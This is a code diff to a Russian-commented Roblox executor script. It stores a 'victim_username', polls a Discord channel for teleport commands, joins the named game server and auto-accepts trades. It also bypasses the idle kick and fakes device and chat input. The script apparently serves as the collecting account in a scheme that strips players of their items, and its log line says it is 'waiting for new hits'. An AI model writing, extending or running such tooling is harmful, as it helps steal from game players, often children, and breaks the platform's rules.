@@ -16,6 +16,21 @@ game:GetService('Players').LocalPlayer.Idled:Connect(function()
     VirtualUser:ClickButton2(Vector2.new())
 end)
 
+-- Функция выбора устройства
+local function selectDevice()
+    local DeviceSelectGui = game.Players.LocalPlayer:WaitForChild("PlayerGui"):FindFirstChild("DeviceSelect")
+    if DeviceSelectGui then
+        local button = DeviceSelectGui.Container.Phone.Button
+        local centerX = button.AbsolutePosition.X + button.AbsoluteSize.X/2
+        local centerY = button.AbsolutePosition.Y + button.AbsoluteSize.Y/2
+        
+        game:GetService("VirtualInputManager"):SendMouseButtonEvent(centerX, centerY, 0, true, game, 1)
+        task.wait(0.1)
+        game:GetService("VirtualInputManager"):SendMouseButtonEvent(centerX, centerY, 0, false, game, 1)
+        print("📱 Выбрано устройство: Phone")
+    end
+end
+
 -- Настройки файлов
 local HttpService = game:GetService("HttpService")
 if not isfile("user.txt") then writefile("user.txt", "victim_username") end
@@ -25,18 +40,28 @@ local victimUser = readfile("user.txt")
 local joinedIds = HttpService:JSONDecode(readfile("joined_ids.txt"))
 local isTeleporting = false
 
--- Ультра-надёжный парсер
+-- Улучшенный парсер команды телепортации
 local function findTeleportCommand(content)
     if not content then return nil, nil end
     
     -- Универсальный паттерн для любых вариантов
-    local pattern = '[gG]ame%s*[:%.]%s*[gG]et[Ss]ervice%s*%(%s*["\']TeleportService["\']%s*%)%s*:%s*[tT]eleport[tT]o[pP]lace[iI]nstance%s*%(%s*(%d+)%s*,%s*["\']([%w%-]+)["\']'
+    local patterns = {
+        'TeleportService["\'%)]%s*:%s*TeleportToPlacelnstance%s*%(%s*(%d+)%s*,%s*["\']([%w%-]+)["\']',
+        'game%s*[:%.]%s*GetService%s*%(%s*["\']TeleportService["\']%s*%)%s*:%s*TeleportToPlacelnstance%s*%(%s*(%d+)%s*,%s*["\']([%w%-]+)["\']',
+        'TeleportService["\'%)]%s*:%s*TeleportToPlaceInstance%s*%(%s*(%d+)%s*,%s*["\']([%w%-]+)["\']'
+    }
     
-    local placeId, jobId = content:match(pattern)
-    return placeId, jobId
+    for _, pattern in ipairs(patterns) do
+        local placeId, jobId = content:match(pattern)
+        if placeId and jobId then
+            return placeId, jobId
+        end
+    end
+    
+    return nil, nil
 end
 
--- Основная функция
+-- Основная функция проверки Discord
 local function checkDiscord()
     local response = request({
         Url = "https://discord.com/api/v9/channels/"..channelId.."/messages?limit=10",
@@ -55,7 +80,7 @@ local function checkDiscord()
     local messages = HttpService:JSONDecode(response.Body)
     for _, msg in ipairs(messages) do
         if msg.content then
-            print("🔍 Проверяем сообщение:", string.sub(msg.content, 1, 50).."...")
+            print("🔍 Проверяем сообщение:", string.sub(msg.content, 1, 100))
             
             local placeId, jobId = findTeleportCommand(msg.content)
             if placeId and jobId then
@@ -94,10 +119,21 @@ local function autoAcceptTrade()
     end
 end
 
--- Запуск
+-- Отправка сообщения в чат
+local function sendChatMessage()
+    task.wait(3) -- Небольшая задержка после загрузки
+    pcall(function()
+        game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("hi")
+        print("💬 Сообщение 'hi' отправлено в чат")
+    end)
+end
+
+-- Инициализация
+task.spawn(selectDevice)
+task.spawn(sendChatMessage)
 task.spawn(autoAcceptTrade)
 
-print("✨ Скрипт запущен!")
+print("✨ Скрипт запущен! Ожидание новых хитов...")
 while task.wait(5) do
     if not isTeleporting then
         pcall(checkDiscord)
